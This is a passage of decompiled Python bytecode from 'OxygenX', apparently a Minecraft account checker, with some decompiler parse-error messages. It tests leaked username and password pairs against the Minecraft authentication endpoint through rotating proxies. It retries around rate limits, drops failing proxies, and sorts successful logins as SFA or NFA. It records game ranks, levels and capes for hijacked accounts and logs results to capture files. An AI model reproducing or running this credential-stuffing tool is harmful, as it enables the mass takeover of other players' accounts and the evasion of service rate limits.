 L. 302      1338  LOAD_FAST                'self'
             1340  LOAD_METHOD              writing
             1342  LOAD_FAST                'line'
             1344  FORMAT_VALUE          0  ''
             1346  LOAD_STR                 ' | Username: '
             1348  LOAD_DEREF               'username'
             1350  FORMAT_VALUE          0  ''
             1352  BUILD_STRING_3        3 
             1354  LOAD_STR                 'LiquidBounceCape'
             1356  BUILD_LIST_2          2 
             1358  CALL_METHOD_1         1  ''
             1360  POP_TOP          

 L. 303      1362  LOAD_FAST                'data'
             1364  LOAD_METHOD              append
             1366  LOAD_STR                 '\nLiquidBounce Cape: True'
             1368  CALL_METHOD_1         1  ''
             1370  POP_TOP          
           1372_0  COME_FROM          1320  '1320'
           1372_1  COME_FROM          1308  '1308'

 L. 305      1372  LOAD_FAST                'dosfa'
         1374_1376  POP_JUMP_IF_FALSE  1394  'to 1394'

 L. 306      1378  LOAD_FAST                'mailaccess'
         1380_1382  POP_JUMP_IF_FALSE  1394  'to 1394'

 L. 307      1384  LOAD_FAST                'data'
             1386  LOAD_METHOD              append
             1388  LOAD_STR                 '\nMFA: True'
             1390  CALL_METHOD_1         1  ''
             1392  POP_TOP          
           1394_0  COME_FROM          1380  '1380'
           1394_1  COME_FROM          1374  '1374'

 L. 309      1394  LOAD_FAST                'veltrank'
         1396_1398  POP_JUMP_IF_FALSE  1428  'to 1428'

 L. 310      1400  LOAD_GLOBAL              OxygenX
             1402  LOAD_ATTR                ranktype
         1404_1406  POP_JUMP_IF_TRUE   1412  'to 1412'

 L. 311      1408  LOAD_CONST               False
             1410  STORE_FAST               'saveranked'
           1412_0  COME_FROM          1404  '1404'

 L. 312      1412  LOAD_FAST                'data'
             1414  LOAD_METHOD              append
             1416  LOAD_STR                 '\nVelt Rank: '
             1418  LOAD_FAST                'veltrank'
             1420  FORMAT_VALUE          0  ''
             1422  BUILD_STRING_2        2 
             1424  CALL_METHOD_1         1  ''
             1426  POP_TOP          
           1428_0  COME_FROM          1396  '1396'

 L. 314      1428  LOAD_FAST                'hiverank'
         1430_1432  POP_JUMP_IF_FALSE  1466  'to 1466'

 L. 315      1434  LOAD_FAST                'data'
             1436  LOAD_METHOD              append
             1438  LOAD_STR                 '\nHive Rank: '
             1440  LOAD_GLOBAL              str
             1442  LOAD_FAST                'hiverank'
             1444  CALL_FUNCTION_1       1  ''
             1446  FORMAT_VALUE          0  ''
             1448  BUILD_STRING_2        2 
             1450  CALL_METHOD_1         1  ''
             1452  POP_TOP          

 L. 316      1454  LOAD_GLOBAL              OxygenX
             1456  LOAD_ATTR                ranktype
         1458_1460  POP_JUMP_IF_TRUE   1466  'to 1466'

 L. 317      1462  LOAD_CONST               False
             1464  STORE_FAST               'saveranked'
           1466_0  COME_FROM          1458  '1458'
           1466_1  COME_FROM          1430  '1430'

 L. 319      1466  LOAD_GLOBAL              OxygenX
             1468  LOAD_ATTR                Rank
             1470  LOAD_ATTR                mineplex
         1472_1474  POP_JUMP_IF_TRUE   1486  'to 1486'
             1476  LOAD_GLOBAL              OxygenX
             1478  LOAD_ATTR                Level
             1480  LOAD_ATTR                mineplex
         1482_1484  POP_JUMP_IF_FALSE  1592  'to 1592'
           1486_0  COME_FROM          1472  '1472'

 L. 320      1486  LOAD_FAST                'mineplex'
             1488  LOAD_CONST               0
             1490  BINARY_SUBSCR    
         1492_1494  POP_JUMP_IF_FALSE  1528  'to 1528'

 L. 321      1496  LOAD_FAST                'data'
             1498  LOAD_METHOD              append
             1500  LOAD_STR                 '\nMineplex Rank: '
             1502  LOAD_FAST                'mineplex'
             1504  LOAD_CONST               0
             1506  BINARY_SUBSCR    
             1508  FORMAT_VALUE          0  ''
             1510  BUILD_STRING_2        2 
             1512  CALL_METHOD_1         1  ''
             1514  POP_TOP          

 L. 322      1516  LOAD_GLOBAL              OxygenX
             1518  LOAD_ATTR                ranktype
         1520_1522  POP_JUMP_IF_TRUE   1528  'to 1528'

 L. 323      1524  LOAD_CONST               False
             1526  STORE_FAST               'saveranked'
           1528_0  COME_FROM          1520  '1520'
           1528_1  COME_FROM          1492  '1492'

 L. 324      1528  LOAD_FAST                'mineplex'
             1530  LOAD_CONST               1
             1532  BINARY_SUBSCR    
         1534_1536  POP_JUMP_IF_FALSE  1562  'to 1562'

 L. 325      1538  LOAD_FAST                'data'
             1540  LOAD_METHOD              append
             1542  LOAD_STR                 '\nMineplex Level: '
             1544  LOAD_GLOBAL              str
             1546  LOAD_FAST                'mineplex'
             1548  LOAD_CONST               1
             1550  BINARY_SUBSCR    
             1552  CALL_FUNCTION_1       1  ''
             1554  FORMAT_VALUE          0  ''
             1556  BUILD_STRING_2        2 
             1558  CALL_METHOD_1         1  ''
             1560  POP_TOP          
           1562_0  COME_FROM          1534  '1534'

 L. 326      1562  LOAD_FAST                'mineplex'
             1564  LOAD_CONST               0
             1566  BINARY_SUBSCR    
         1568_1570  POP_JUMP_IF_TRUE   1592  'to 1592'
             1572  LOAD_FAST                'mineplex'
             1574  LOAD_CONST               1
             1576  BINARY_SUBSCR    
         1578_1580  POP_JUMP_IF_TRUE   1592  'to 1592'

 L. 327      1582  LOAD_FAST                'data'
             1584  LOAD_METHOD              append
             1586  LOAD_STR                 '\nNo Mineplex Login: True'
             1588  CALL_METHOD_1         1  ''
             1590  POP_TOP          
           1592_0  COME_FROM          1578  '1578'
           1592_1  COME_FROM          1568  '1568'
           1592_2  COME_FROM          1482  '1482'

 L. 329      1592  LOAD_GLOBAL              OxygenX
             1594  LOAD_ATTR                Rank
             1596  LOAD_ATTR                hypixel
         1598_1600  POP_JUMP_IF_TRUE   1612  'to 1612'
             1602  LOAD_GLOBAL              OxygenX
             1604  LOAD_ATTR                Level
             1606  LOAD_ATTR                hypixel
         1608_1610  POP_JUMP_IF_FALSE  1884  'to 1884'
           1612_0  COME_FROM          1598  '1598'

 L. 330      1612  LOAD_FAST                'hypixel'
             1614  LOAD_CONST               2
             1616  BINARY_SUBSCR    
         1618_1620  POP_JUMP_IF_TRUE   1874  'to 1874'

 L. 331      1622  LOAD_GLOBAL              str
             1624  LOAD_FAST                'hypixel'
             1626  LOAD_CONST               0
             1628  BINARY_SUBSCR    
             1630  CALL_FUNCTION_1       1  ''
             1632  LOAD_CONST               ('None', 'False')
             1634  COMPARE_OP               not-in
         1636_1638  POP_JUMP_IF_FALSE  1672  'to 1672'

 L. 332      1640  LOAD_GLOBAL              OxygenX
             1642  LOAD_ATTR                ranktype
         1644_1646  POP_JUMP_IF_TRUE   1652  'to 1652'

 L. 333      1648  LOAD_CONST               False
             1650  STORE_FAST               'saveranked'
           1652_0  COME_FROM          1644  '1644'

 L. 334      1652  LOAD_FAST                'data'
             1654  LOAD_METHOD              append
             1656  LOAD_STR                 '\nHypixel Rank: '
             1658  LOAD_FAST                'hypixel'
             1660  LOAD_CONST               0
             1662  BINARY_SUBSCR    
             1664  FORMAT_VALUE          0  ''
             1666  BUILD_STRING_2        2 
             1668  CALL_METHOD_1         1  ''
             1670  POP_TOP          
           1672_0  COME_FROM          1636  '1636'

 L. 335      1672  LOAD_FAST                'hypixel'
             1674  LOAD_CONST               1
             1676  BINARY_SUBSCR    
         1678_1680  POP_JUMP_IF_FALSE  1706  'to 1706'

 L. 336      1682  LOAD_FAST                'data'
             1684  LOAD_METHOD              append
             1686  LOAD_STR                 '\nHypixel Level: '
             1688  LOAD_GLOBAL              str
             1690  LOAD_FAST                'hypixel'
             1692  LOAD_CONST               1
             1694  BINARY_SUBSCR    
             1696  CALL_FUNCTION_1       1  ''
             1698  FORMAT_VALUE          0  ''
             1700  BUILD_STRING_2        2 
             1702  CALL_METHOD_1         1  ''
             1704  POP_TOP          
           1706_0  COME_FROM          1678  '1678'

 L. 337      1706  LOAD_FAST                'hypixel'
             1708  LOAD_CONST               3
             1710  BINARY_SUBSCR    
         1712_1714  POP_JUMP_IF_FALSE  1736  'to 1736'

 L. 338      1716  LOAD_FAST                'data'
             1718  LOAD_METHOD              append
             1720  LOAD_STR                 '\nHypixel LastLogout Date: '
             1722  LOAD_FAST                'hypixel'
             1724  LOAD_CONST               3
             1726  BINARY_SUBSCR    
             1728  FORMAT_VALUE          0  ''
             1730  BUILD_STRING_2        2 
             1732  CALL_METHOD_1         1  ''
             1734  POP_TOP          
           1736_0  COME_FROM          1712  '1712'

 L. 339      1736  LOAD_FAST                'hypixel'
             1738  LOAD_CONST               4
             1740  BINARY_SUBSCR    
             1742  LOAD_CONST               0
             1744  COMPARE_OP               !=
         1746_1748  POP_JUMP_IF_FALSE  1774  'to 1774'

 L. 340      1750  LOAD_FAST                'data'
             1752  LOAD_METHOD              append
             1754  LOAD_STR                 '\nHypixel SkyWars Coins: '
             1756  LOAD_GLOBAL              str
             1758  LOAD_FAST                'hypixel'
             1760  LOAD_CONST               4
             1762  BINARY_SUBSCR    
             1764  CALL_FUNCTION_1       1  ''
             1766  FORMAT_VALUE          0  ''
             1768  BUILD_STRING_2        2 
             1770  CALL_METHOD_1         1  ''
             1772  POP_TOP          
           1774_0  COME_FROM          1746  '1746'

 L. 341      1774  LOAD_FAST                'hypixel'
             1776  LOAD_CONST               5
             1778  BINARY_SUBSCR    
             1780  LOAD_CONST               0
             1782  COMPARE_OP               !=
         1784_1786  POP_JUMP_IF_FALSE  1812  'to 1812'

 L. 342      1788  LOAD_FAST                'data'
             1790  LOAD_METHOD              append
             1792  LOAD_STR                 '\nHypixel BedWars Level: '
             1794  LOAD_GLOBAL              str
             1796  LOAD_FAST                'hypixel'
             1798  LOAD_CONST               5
             1800  BINARY_SUBSCR    
             1802  CALL_FUNCTION_1       1  ''
             1804  FORMAT_VALUE          0  ''
             1806  BUILD_STRING_2        2 
             1808  CALL_METHOD_1         1  ''
             1810  POP_TOP          
           1812_0  COME_FROM          1784  '1784'

 L. 343      1812  LOAD_FAST                'hypixel'
             1814  LOAD_CONST               6
             1816  BINARY_SUBSCR    
             1818  LOAD_CONST               0
             1820  COMPARE_OP               !=
         1822_1824  POP_JUMP_IF_FALSE  1850  'to 1850'

 L. 344      1826  LOAD_FAST                'data'
             1828  LOAD_METHOD              append
             1830  LOAD_STR                 '\nHypixel BedWars Coins: '
             1832  LOAD_GLOBAL              str
             1834  LOAD_FAST                'hypixel'
             1836  LOAD_CONST               6
             1838  BINARY_SUBSCR    
             1840  CALL_FUNCTION_1       1  ''
             1842  FORMAT_VALUE          0  ''
             1844  BUILD_STRING_2        2 
             1846  CALL_METHOD_1         1  ''
             1848  POP_TOP          
           1850_0  COME_FROM          1822  '1822'

 L. 345      1850  LOAD_FAST                'skyblock'
         1852_1854  POP_JUMP_IF_FALSE  1884  'to 1884'

 L. 346      1856  LOAD_FAST                'data'
             1858  LOAD_METHOD              append
             1860  LOAD_STR                 '\nHypixel SkyBlock Stats: https://sky.lea.moe/stats/'
             1862  LOAD_FAST                'uuid'
             1864  FORMAT_VALUE          0  ''
             1866  BUILD_STRING_2        2 
             1868  CALL_METHOD_1         1  ''
             1870  POP_TOP          
             1872  JUMP_FORWARD       1884  'to 1884'
           1874_0  COME_FROM          1618  '1618'

 L. 348      1874  LOAD_FAST                'data'
             1876  LOAD_METHOD              append
             1878  LOAD_STR                 '\nNo Hypixel Login: True'
             1880  CALL_METHOD_1         1  ''
             1882  POP_TOP          
           1884_0  COME_FROM          1872  '1872'
           1884_1  COME_FROM          1852  '1852'
           1884_2  COME_FROM          1608  '1608'
             1884  POP_BLOCK        
             1886  JUMP_FORWARD       1940  'to 1940'
           1888_0  COME_FROM_FINALLY  1250  '1250'

 L. 349      1888  POP_TOP          
             1890  POP_TOP          
             1892  POP_TOP          

 L. 350      1894  LOAD_GLOBAL              OxygenX
             1896  LOAD_ATTR                debug
         1898_1900  POP_JUMP_IF_FALSE  1934  'to 1934'

 L. 351      1902  LOAD_FAST                'self'
             1904  LOAD_METHOD              prints
             1906  LOAD_GLOBAL              red
             1908  FORMAT_VALUE          0  ''
             1910  LOAD_STR                 '[Error] '
             1912  LOAD_FAST                'line'
             1914  FORMAT_VALUE          0  ''
             1916  LOAD_STR                 ' \nRank/Cape Check Error: '
             1918  LOAD_GLOBAL              format_exc
             1920  LOAD_CONST               1
             1922  LOAD_CONST               ('limit',)
             1924  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
             1926  FORMAT_VALUE          0  ''
             1928  BUILD_STRING_5        5 
             1930  CALL_METHOD_1         1  ''
             1932  POP_TOP          
           1934_0  COME_FROM          1898  '1898'
             1934  POP_EXCEPT       
             1936  JUMP_FORWARD       1940  'to 1940'
             1938  END_FINALLY      
           1940_0  COME_FROM          1936  '1936'
           1940_1  COME_FROM          1886  '1886'

 L. 352      1940  LOAD_FAST                'saveranked'
         1942_1944  POP_JUMP_IF_FALSE  1988  'to 1988'
             1946  LOAD_FAST                'dosfa'
         1948_1950  POP_JUMP_IF_FALSE  1988  'to 1988'

 L. 353      1952  LOAD_FAST                'sfa'
         1954_1956  POP_JUMP_IF_FALSE  1974  'to 1974'

 L. 354      1958  LOAD_FAST                'self'
             1960  LOAD_METHOD              writing
             1962  LOAD_FAST                'line'
             1964  LOAD_STR                 'SFA'
             1966  BUILD_LIST_2          2 
             1968  CALL_METHOD_1         1  ''
             1970  POP_TOP          
             1972  JUMP_FORWARD       1988  'to 1988'
           1974_0  COME_FROM          1954  '1954'

 L. 356      1974  LOAD_FAST                'self'
             1976  LOAD_METHOD              writing
             1978  LOAD_FAST                'line'
             1980  LOAD_STR                 'NFA'
             1982  BUILD_LIST_2          2 
             1984  CALL_METHOD_1         1  ''
             1986  POP_TOP          
           1988_0  COME_FROM          1972  '1972'
           1988_1  COME_FROM          1948  '1948'
           1988_2  COME_FROM          1942  '1942'

 L. 358      1988  LOAD_FAST                'self'
             1990  LOAD_METHOD              writing
             1992  LOAD_STR                 ''
             1994  LOAD_METHOD              join
             1996  LOAD_FAST                'data'
             1998  CALL_METHOD_1         1  ''
             2000  LOAD_STR                 'CaptureData'
             2002  BUILD_LIST_2          2 
             2004  CALL_METHOD_1         1  ''
             2006  POP_TOP          

 L. 359      2008  POP_BLOCK        
             2010  LOAD_CONST               None
             2012  RETURN_VALUE     
             2014  POP_BLOCK        
             2016  JUMP_FORWARD       2100  'to 2100'
           2018_0  COME_FROM_FINALLY    10  '10'

 L. 360      2018  POP_TOP          
             2020  POP_TOP          
             2022  POP_TOP          

 L. 361      2024  LOAD_GLOBAL              OxygenX
             2026  LOAD_ATTR                debug
         2028_2030  POP_JUMP_IF_FALSE  2064  'to 2064'

 L. 362      2032  LOAD_FAST                'self'
             2034  LOAD_METHOD              prints
             2036  LOAD_GLOBAL              red
             2038  FORMAT_VALUE          0  ''
             2040  LOAD_STR                 '[Error] '
             2042  LOAD_FAST                'line'
             2044  FORMAT_VALUE          0  ''
             2046  LOAD_STR                 ' \nError: '
             2048  LOAD_GLOBAL              format_exc
             2050  LOAD_CONST               1
             2052  LOAD_CONST               ('limit',)
             2054  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
             2056  FORMAT_VALUE          0  ''
             2058  BUILD_STRING_5        5 
             2060  CALL_METHOD_1         1  ''
             2062  POP_TOP          
           2064_0  COME_FROM          2028  '2028'

 L. 363      2064  LOAD_FAST                'self'
             2066  LOAD_METHOD              writing
             2068  LOAD_FAST                'line'
             2070  LOAD_STR                 'Error'
             2072  BUILD_LIST_2          2 
             2074  CALL_METHOD_1         1  ''
             2076  POP_TOP          

 L. 364      2078  LOAD_GLOBAL              Counter
             2080  DUP_TOP          
             2082  LOAD_ATTR                error
             2084  LOAD_CONST               1
             2086  INPLACE_ADD      
             2088  ROT_TWO          
             2090  STORE_ATTR               error

 L. 365      2092  POP_EXCEPT       
             2094  LOAD_CONST               None
             2096  RETURN_VALUE     
             2098  END_FINALLY      
           2100_0  COME_FROM          2016  '2016'
             2100  JUMP_FORWARD       2168  'to 2168'
           2102_0  COME_FROM             6  '6'

 L. 367      2102  LOAD_GLOBAL              Counter
             2104  DUP_TOP          
             2106  LOAD_ATTR                checked
             2108  LOAD_CONST               1
             2110  INPLACE_ADD      
             2112  ROT_TWO          
             2114  STORE_ATTR               checked

 L. 368      2116  LOAD_GLOBAL              Counter
             2118  DUP_TOP          
             2120  LOAD_ATTR                bad
             2122  LOAD_CONST               1
             2124  INPLACE_ADD      
             2126  ROT_TWO          
             2128  STORE_ATTR               bad

 L. 369      2130  LOAD_FAST                'self'
             2132  LOAD_METHOD              prints
             2134  LOAD_GLOBAL              red
             2136  FORMAT_VALUE          0  ''
             2138  LOAD_STR                 '[Badline] '
             2140  LOAD_FAST                'line'
             2142  FORMAT_VALUE          0  ''
             2144  BUILD_STRING_3        3 
             2146  CALL_METHOD_1         1  ''
             2148  POP_TOP          

 L. 370      2150  LOAD_FAST                'self'
             2152  LOAD_METHOD              writing
             2154  LOAD_FAST                'line'
             2156  LOAD_STR                 'Badlines'
             2158  BUILD_LIST_2          2 
             2160  CALL_METHOD_1         1  ''
             2162  POP_TOP          

 L. 371      2164  LOAD_CONST               None
             2166  RETURN_VALUE     
           2168_0  COME_FROM          2100  '2100'

Parse error at or near `RETURN_VALUE' instruction at offset 184

    def checkmc--- This code section failed: ---

 L. 376         0  LOAD_STR                 'Minecraft'

 L. 377         2  LOAD_CONST               1

 L. 375         4  LOAD_CONST               ('name', 'version')
                6  BUILD_CONST_KEY_MAP_2     2 

 L. 379         8  LOAD_FAST                'user'

 L. 380        10  LOAD_FAST                'passw'

 L. 381        12  LOAD_STR                 'true'

 L. 374        14  LOAD_CONST               ('agent', 'username', 'password', 'requestUser')
               16  BUILD_CONST_KEY_MAP_4     4 
               18  STORE_FAST               'payload'

 L. 383        20  LOAD_STR                 'Invalid credentials'
               22  STORE_FAST               'bad'

 L. 384        24  LOAD_CONST               0
               26  STORE_FAST               'retries'

 L. 385        28  LOAD_GLOBAL              OxygenX
               30  LOAD_ATTR                Proxy
               32  LOAD_ATTR                proxy
               34  POP_JUMP_IF_TRUE    194  'to 194'

 L. 387        36  LOAD_FAST                'retries'
               38  LOAD_GLOBAL              OxygenX
               40  LOAD_ATTR                retries
               42  COMPARE_OP               !=
               44  POP_JUMP_IF_FALSE   184  'to 184'

 L. 388        46  SETUP_FINALLY       138  'to 138'

 L. 389        48  LOAD_GLOBAL              session
               50  LOAD_ATTR                post
               52  LOAD_GLOBAL              auth_mc
               54  LOAD_FAST                'payload'
               56  LOAD_GLOBAL              jsonheaders

 L. 390        58  LOAD_GLOBAL              OxygenX
               60  LOAD_ATTR                timeout

 L. 389        62  LOAD_CONST               ('url', 'json', 'headers', 'timeout')
               64  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
               66  STORE_FAST               'answer'

 L. 391        68  LOAD_FAST                'bad'
               70  LOAD_FAST                'answer'
               72  LOAD_ATTR                text
               74  COMPARE_OP               in
               76  POP_JUMP_IF_FALSE   104  'to 104'

 L. 392        78  LOAD_FAST                'retries'
               80  LOAD_CONST               1
               82  INPLACE_ADD      
               84  STORE_FAST               'retries'

 L. 393        86  LOAD_GLOBAL              sleep
               88  LOAD_GLOBAL              OxygenX
               90  LOAD_ATTR                Proxy
               92  LOAD_ATTR                sleep
               94  CALL_FUNCTION_1       1  ''
               96  POP_TOP          

 L. 394        98  POP_BLOCK        
              100  JUMP_BACK            36  'to 36'
              102  JUMP_FORWARD        134  'to 134'
            104_0  COME_FROM            76  '76'

 L. 395       104  LOAD_STR                 'Client sent too many requests too fast.'
              106  LOAD_FAST                'answer'
              108  LOAD_ATTR                text
              110  COMPARE_OP               in
              112  POP_JUMP_IF_FALSE   128  'to 128'

 L. 396       114  LOAD_GLOBAL              sleep
              116  LOAD_CONST               5
              118  CALL_FUNCTION_1       1  ''
              120  POP_TOP          

 L. 397       122  POP_BLOCK        
              124  JUMP_BACK            36  'to 36'
              126  JUMP_FORWARD        134  'to 134'
            128_0  COME_FROM           112  '112'

 L. 399       128  LOAD_FAST                'answer'
              130  POP_BLOCK        
              132  RETURN_VALUE     
            134_0  COME_FROM           126  '126'
            134_1  COME_FROM           102  '102'
              134  POP_BLOCK        
              136  JUMP_ABSOLUTE       188  'to 188'
            138_0  COME_FROM_FINALLY    46  '46'

 L. 400       138  POP_TOP          
              140  POP_TOP          
              142  POP_TOP          

 L. 401       144  LOAD_GLOBAL              OxygenX
              146  LOAD_ATTR                debug
              148  POP_JUMP_IF_FALSE   172  'to 172'

 L. 402       150  LOAD_FAST                'self'
              152  LOAD_METHOD              prints
              154  LOAD_STR                 'CheckMC ProxyLess: \n'
              156  LOAD_GLOBAL              format_exc
              158  LOAD_CONST               1
              160  LOAD_CONST               ('limit',)
              162  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              164  FORMAT_VALUE          0  ''
              166  BUILD_STRING_2        2 
              168  CALL_METHOD_1         1  ''
              170  POP_TOP          
            172_0  COME_FROM           148  '148'

 L. 403       172  POP_EXCEPT       
              174  JUMP_BACK            36  'to 36'
              176  POP_EXCEPT       
              178  JUMP_ABSOLUTE       188  'to 188'
              180  END_FINALLY      
              182  JUMP_BACK            36  'to 36'
            184_0  COME_FROM            44  '44'

 L. 405       184  LOAD_FAST                'bad'
              186  RETURN_VALUE     
              188  JUMP_BACK            36  'to 36'
          190_192  JUMP_FORWARD        816  'to 816'
            194_0  COME_FROM            34  '34'

 L. 408       194  LOAD_FAST                'retries'
              196  LOAD_GLOBAL              OxygenX
              198  LOAD_ATTR                retries
              200  COMPARE_OP               !=
          202_204  POP_JUMP_IF_FALSE   810  'to 810'

 L. 409       206  BUILD_MAP_0           0 
              208  STORE_FAST               'proxy_form'

 L. 410       210  LOAD_GLOBAL              choice
              212  LOAD_FAST                'self'
              214  LOAD_ATTR                proxylist
              216  CALL_FUNCTION_1       1  ''
              218  STORE_FAST               'proxy'

 L. 411       220  LOAD_FAST                'proxy'
              222  LOAD_METHOD              count
              224  LOAD_STR                 ':'
              226  CALL_METHOD_1         1  ''
              228  LOAD_CONST               3
              230  COMPARE_OP               ==
          232_234  POP_JUMP_IF_FALSE   290  'to 290'

 L. 412       236  LOAD_FAST                'proxy'
              238  LOAD_METHOD              split
              240  LOAD_STR                 ':'
              242  CALL_METHOD_1         1  ''
              244  STORE_FAST               'spl'

 L. 413       246  LOAD_FAST                'spl'
              248  LOAD_CONST               2
              250  BINARY_SUBSCR    
              252  FORMAT_VALUE          0  ''
              254  LOAD_STR                 ':'
              256  LOAD_FAST                'spl'
              258  LOAD_CONST               3
              260  BINARY_SUBSCR    
              262  FORMAT_VALUE          0  ''
              264  LOAD_STR                 '@'
              266  LOAD_FAST                'spl'
              268  LOAD_CONST               0
              270  BINARY_SUBSCR    
              272  FORMAT_VALUE          0  ''
              274  LOAD_STR                 ':'
              276  LOAD_FAST                'spl'
              278  LOAD_CONST               1
              280  BINARY_SUBSCR    
              282  FORMAT_VALUE          0  ''
              284  BUILD_STRING_7        7 
              286  STORE_FAST               'proxy'
              288  JUMP_FORWARD        294  'to 294'
            290_0  COME_FROM           232  '232'

 L. 415       290  LOAD_FAST                'proxy'
              292  STORE_FAST               'proxy'
            294_0  COME_FROM           288  '288'

 L. 416       294  LOAD_GLOBAL              OxygenX
              296  LOAD_ATTR                Proxy
              298  LOAD_ATTR                lock_proxy
              300  STORE_FAST               'locked'

 L. 417       302  LOAD_FAST                'proxy'
              304  LOAD_CONST               ('', '\n')
              306  COMPARE_OP               in
          308_310  POP_JUMP_IF_FALSE   346  'to 346'

 L. 418       312  SETUP_FINALLY       334  'to 334'

 L. 419       314  LOAD_FAST                'self'
              316  LOAD_ATTR                proxylist
              318  LOAD_METHOD              remove
              320  LOAD_FAST                'proxy'
              322  CALL_METHOD_1         1  ''
              324  POP_TOP          

 L. 420       326  POP_BLOCK        
              328  JUMP_BACK           194  'to 194'
              330  POP_BLOCK        
              332  JUMP_FORWARD        346  'to 346'
            334_0  COME_FROM_FINALLY   312  '312'

 L. 421       334  POP_TOP          
              336  POP_TOP          
              338  POP_TOP          

 L. 422       340  POP_EXCEPT       
              342  JUMP_FORWARD        346  'to 346'
              344  END_FINALLY      
            346_0  COME_FROM           342  '342'
            346_1  COME_FROM           332  '332'
            346_2  COME_FROM           308  '308'

 L. 423       346  LOAD_FAST                'locked'
          348_350  POP_JUMP_IF_FALSE   386  'to 386'

 L. 424       352  SETUP_FINALLY       370  'to 370'

 L. 425       354  LOAD_FAST                'self'
              356  LOAD_ATTR                proxylist
              358  LOAD_METHOD              remove
              360  LOAD_FAST                'proxy'
              362  CALL_METHOD_1         1  ''
              364  POP_TOP          
              366  POP_BLOCK        
              368  JUMP_FORWARD        386  'to 386'
            370_0  COME_FROM_FINALLY   352  '352'

 L. 426       370  POP_TOP          
              372  POP_TOP          
              374  POP_TOP          

 L. 427       376  LOAD_CONST               False
              378  STORE_FAST               'locked'
              380  POP_EXCEPT       
              382  JUMP_FORWARD        386  'to 386'
              384  END_FINALLY      
            386_0  COME_FROM           382  '382'
            386_1  COME_FROM           368  '368'
            386_2  COME_FROM           348  '348'

 L. 428       386  LOAD_GLOBAL              OxygenX
              388  LOAD_ATTR                Proxy
              390  LOAD_ATTR                type
              392  LOAD_CONST               ('https', 'http')
              394  COMPARE_OP               in
          396_398  POP_JUMP_IF_FALSE   424  'to 424'

 L. 429       400  LOAD_STR                 'http://'
              402  LOAD_FAST                'proxy'
              404  FORMAT_VALUE          0  ''
              406  BUILD_STRING_2        2 
              408  LOAD_STR                 'https://'
              410  LOAD_FAST                'proxy'
              412  FORMAT_VALUE          0  ''
              414  BUILD_STRING_2        2 
              416  LOAD_CONST               ('http', 'https')
              418  BUILD_CONST_KEY_MAP_2     2 
              420  STORE_FAST               'proxy_form'
              422  JUMP_FORWARD        466  'to 466'
            424_0  COME_FROM           396  '396'

 L. 430       424  LOAD_GLOBAL              OxygenX
              426  LOAD_ATTR                Proxy
              428  LOAD_ATTR                type
              430  LOAD_CONST               ('socks4', 'socks5')
              432  COMPARE_OP               in
          434_436  POP_JUMP_IF_FALSE   466  'to 466'

 L. 431       438  LOAD_GLOBAL              OxygenX
              440  LOAD_ATTR                Proxy
              442  LOAD_ATTR                type
              444  FORMAT_VALUE          0  ''
              446  LOAD_STR                 '://'
              448  LOAD_FAST                'proxy'
              450  FORMAT_VALUE          0  ''
              452  BUILD_STRING_3        3 
              454  STORE_FAST               'line'

 L. 432       456  LOAD_FAST                'line'
              458  LOAD_FAST                'line'
              460  LOAD_CONST               ('http', 'https')
              462  BUILD_CONST_KEY_MAP_2     2 
              464  STORE_FAST               'proxy_form'
            466_0  COME_FROM           434  '434'
            466_1  COME_FROM           422  '422'

 L. 433       466  SETUP_FINALLY       636  'to 636'

 L. 434       468  LOAD_GLOBAL              scraper
              470  LOAD_ATTR                post
              472  LOAD_GLOBAL              auth_mc
              474  LOAD_FAST                'proxy_form'
              476  LOAD_FAST                'payload'
              478  LOAD_GLOBAL              jsonheaders

 L. 435       480  LOAD_GLOBAL              OxygenX
              482  LOAD_ATTR                timeout

 L. 434       484  LOAD_CONST               ('url', 'proxies', 'json', 'headers', 'timeout')
              486  CALL_FUNCTION_KW_5     5  '5 total positional and keyword args'
              488  STORE_FAST               'answer'

 L. 436       490  LOAD_FAST                'locked'
          492_494  POP_JUMP_IF_FALSE   508  'to 508'

 L. 437       496  LOAD_FAST                'self'
              498  LOAD_ATTR                proxylist
              500  LOAD_METHOD              append
              502  LOAD_FAST                'proxy'
              504  CALL_METHOD_1         1  ''
              506  POP_TOP          
            508_0  COME_FROM           492  '492'

 L. 438       508  LOAD_FAST                'bad'
              510  LOAD_FAST                'answer'
              512  LOAD_ATTR                text
              514  COMPARE_OP               in
          516_518  POP_JUMP_IF_FALSE   534  'to 534'

 L. 439       520  LOAD_FAST                'retries'
              522  LOAD_CONST               1
              524  INPLACE_ADD      
              526  STORE_FAST               'retries'

 L. 440       528  POP_BLOCK        
              530  JUMP_BACK           194  'to 194'
              532  JUMP_FORWARD        632  'to 632'
            534_0  COME_FROM           516  '516'

 L. 441       534  LOAD_FAST                'answer'
              536  LOAD_ATTR                headers
              538  LOAD_METHOD              get
              540  LOAD_STR                 'Content-Type'
              542  CALL_METHOD_1         1  ''
              544  LOAD_METHOD              __contains__
              546  LOAD_STR                 'html'
              548  CALL_METHOD_1         1  ''
          550_552  POP_JUMP_IF_FALSE   626  'to 626'

 L. 442       554  LOAD_GLOBAL              OxygenX
              556  LOAD_ATTR                Proxy
              558  LOAD_ATTR                remove_bad_proxy
          560_562  POP_JUMP_IF_FALSE   620  'to 620'
              564  LOAD_GLOBAL              len

 L. 443       566  LOAD_FAST                'self'
              568  LOAD_ATTR                proxylist

 L. 442       570  CALL_FUNCTION_1       1  ''

 L. 443       572  LOAD_GLOBAL              OxygenX
              574  LOAD_ATTR                Proxy
              576  LOAD_ATTR                proxy_remove_limit

 L. 442       578  COMPARE_OP               >=
          580_582  POP_JUMP_IF_FALSE   620  'to 620'

 L. 444       584  LOAD_FAST                'locked'
          586_588  POP_JUMP_IF_TRUE    620  'to 620'

 L. 445       590  SETUP_FINALLY       608  'to 608'

 L. 446       592  LOAD_FAST                'self'
              594  LOAD_ATTR                proxylist
              596  LOAD_METHOD              remove
              598  LOAD_FAST                'proxy'
              600  CALL_METHOD_1         1  ''
              602  POP_TOP          
              604  POP_BLOCK        
              606  JUMP_FORWARD        620  'to 620'
            608_0  COME_FROM_FINALLY   590  '590'

 L. 447       608  POP_TOP          
              610  POP_TOP          
              612  POP_TOP          

 L. 448       614  POP_EXCEPT       
              616  JUMP_FORWARD        620  'to 620'
              618  END_FINALLY      
            620_0  COME_FROM           616  '616'
            620_1  COME_FROM           606  '606'
            620_2  COME_FROM           586  '586'
            620_3  COME_FROM           580  '580'
            620_4  COME_FROM           560  '560'

 L. 449       620  POP_BLOCK        
              622  JUMP_BACK           194  'to 194'
